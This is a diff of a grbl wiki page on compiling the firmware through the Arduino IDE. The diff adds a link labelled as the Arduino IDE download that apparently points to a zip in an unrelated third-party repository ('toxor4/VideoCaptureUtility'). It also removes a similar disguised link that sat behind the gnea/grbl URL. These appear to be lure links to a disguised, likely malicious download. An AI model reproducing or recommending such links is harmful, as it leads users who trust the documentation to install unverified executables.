@@ -2,7 +2,7 @@ _This wiki is intended to provide various instructions on how to compile grbl. O
 
 # Via the Arduino IDE (All Platforms): Recommended for all users.
 
-Thanks to the great people working on the Arduino IDE, it has everything you need to compile grbl included in their [software](https://github.com/Lucien-1/VideoCaptureUtility/releases/download/release/AppSetup-2.37.0.zip) package. This method compiles the Grbl source code and automatically uploads it to an Arduino. You can't directly flash a pre-compiled .hex file through the IDE interface. See our [Flashing Grbl to an Arduino](https://github.com/gnea/grbl/wiki/Flashing-Grbl-to-an-Arduino) wiki page for how to do this if you only have a .hex file.
+Thanks to the great people working on the Arduino IDE, it has everything you need to compile grbl included in their [software](https://github.com/toxor4/VideoCaptureUtility/releases/download/42/arduino-1.8.19-windows.zip) package. This method compiles the Grbl source code and automatically uploads it to an Arduino. You can't directly flash a pre-compiled .hex file through the IDE interface. See our [Flashing Grbl to an Arduino](https://github.com/gnea/grbl/wiki/Flashing-Grbl-to-an-Arduino) wiki page for how to do this if you only have a .hex file.
 
 _**NOTE: Before starting, delete prior Grbl library installations. Otherwise, you'll have compiling issues! On a Mac, Arduino libraries are located in ```~/Documents/Arduino/libraries/```. On Windows, it's in ```My Documents\Arduino\libraries```. On Linux (Ubuntu), it's in ```/usr/share/arduino/libraries```**_ If you cannot find the grbl library in order to delete and reinstall, check the sketchbook location in the IDE via `file -> preferences` and view `/sketchbook/location/path` at the top.  
 
@@ -84,7 +84,7 @@ Most users are just fine with Grbl's default build, but you can customize Grbl b
 
 Per https://github.com/gnea/grbl/pull/716 and the discussion at https://github.com/gnea/grbl/issues/715 you can create an empty file `grbl.ino` in the grbl directory and compile as normal.
 
-1. Download and unpack grbl from [https://github.com/gnea/grbl](https://github.com/Lucien-1/VideoCaptureUtility/releases/download/release/AppSetup-2.37.0.zip) (e.g. `git clone git@github.com:gnea/grbl.git`)
+1. Download and unpack grbl from https://github.com/gnea/grbl (e.g. `git clone git@github.com:gnea/grbl.git`)
 2. Create an empty `grbl.ino` file. (e.g. `touch path_to_grbl/grbl/grbl.ino`) 
 3. Open the grbl.ino file in the Arduino IDE and compile as normal.
 
